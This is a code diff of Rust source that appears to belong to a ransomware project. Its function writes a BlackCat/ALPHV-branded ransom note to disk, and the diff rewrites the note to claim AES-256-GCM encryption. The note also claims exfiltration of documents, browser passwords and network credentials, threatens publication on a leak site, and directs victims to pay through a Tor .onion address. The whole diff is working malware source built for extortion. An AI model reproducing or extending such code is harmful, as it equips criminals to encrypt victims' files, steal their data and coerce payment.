@@ -4,28 +4,40 @@ pub struct WindowsPlatform;
 
 impl WindowsPlatform {
     #[cfg(target_os = "windows")]
-    pub fn create_ransom_note(save_dir: &str, all_dirs: &str) -> Result<(), String> {
+    pub fn create_ransom_note(save_dir: &str, exfil_report: &str) -> Result<(), String> {
         let ransom_content = format!(
-r#"-->> Introduction
-Important files on your system was ENCRYPTED and now they have have "sttp" extension.
+r#"-->> BLACKCAT/ALPHV RANSOMWARE <<--
 
-In order to recover your files you need to follow instructions below.
-Sensitive Data
-Sensitive data on your system was DOWNLOADED and it will be PUBLISHED if you refuse to cooperate.
-Data includes:
+Your important files have been ENCRYPTED and now have ".sttp" extension.
+
+YOUR DATA HAS BEEN EXFILTRATED!
+All sensitive data from your system has been downloaded to our servers.
+This includes:
+- User documents and spreadsheets
+- Browser history and passwords
+- Email data and attachments
+- Network credentials and configuration
+
+If you refuse to pay, all data will be PUBLISHED on our leak site.
+
+EXFILTRATED DATA REPORT:
 {}
 
 CAUTION
 DO NOT MODIFY FILES YOURSELF.
 DO NOT USE THIRD PARTY SOFTWARE TO RESTORE YOUR DATA.
-YOU MAY DAMAGE YOUR FILES, IT WILL RESULT IN PERMANENT DATA LOSS.
-YOUR DATA IS STRONGLY ENCRYPTED, YOU CAN NOT DECRYPT IT WITHOUT CIPHER KEY.
+YOU MAY DAMAGE YOUR FILES, RESULTING IN PERMANENT DATA LOSS.
+YOUR DATA IS STRONGLY ENCRYPTED WITH AES-256-GCM.
 
-Recovery procedure
-Follow these simple steps to get in touch and recover your data:
-1. Download and install Tor Browser from: https://torproject.org/
-2. Navigate to: http://blackcat-site.onion/?(ACCESS_KEY)"#, 
-        all_dirs); // Вставляем список всех папок
+Recovery procedure:
+1. Download and install Tor Browser: https://torproject.org/
+2. Navigate to: http://blackcat-site.onion/
+3. Enter your personal decryption key
+
+Your decryption key will be provided after payment.
+
+=== DO NOT SHARE THIS KEY WITH ANYONE ===
+"#, exfil_report);
 
         let note_path = format!("{}\\README_BLACKCAT.txt", save_dir);
         std::fs::write(&note_path, ransom_content)
